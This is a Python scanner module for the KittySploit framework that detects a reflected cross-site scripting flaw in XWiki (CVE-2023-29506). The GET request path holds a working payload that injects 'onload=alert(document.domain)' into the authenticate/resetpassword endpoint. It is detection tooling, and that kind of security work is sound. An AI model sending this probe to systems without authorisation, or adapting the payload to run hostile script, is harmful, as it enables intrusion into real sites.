#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Reflected XSS vulnerability in XWiki authenticate endpoints allows execution of arbitrary JavaScript."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki >= 13.10.8 - Cross-Site Scripting Detection',
        'description': 'Reflected XSS vulnerability in XWiki authenticate endpoints allows execution of arbitrary JavaScript.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xwiki', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-jjm5-5v9v-7hx2',
            'https://jira.xwiki.org/browse/XWIKI-20335',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-29506',
        ],
        'cve': 'CVE-2023-29506',
    }

    def run(self):
        r = self.http_request(method="GET", path='/xwiki/authenticate/wiki/xwiki%22onload=%22alert(document.domain)%22/resetpassword', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('wiki-xwiki"onload="alert(document.domain)"', 'resetPasswordForm',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="XWiki >= 13.10.8 - Cross-Site Scripting detected",
                path='/xwiki/authenticate/wiki/xwiki%22onload=%22alert(document.domain)%22/resetpassword',
            )
            return True
        return False

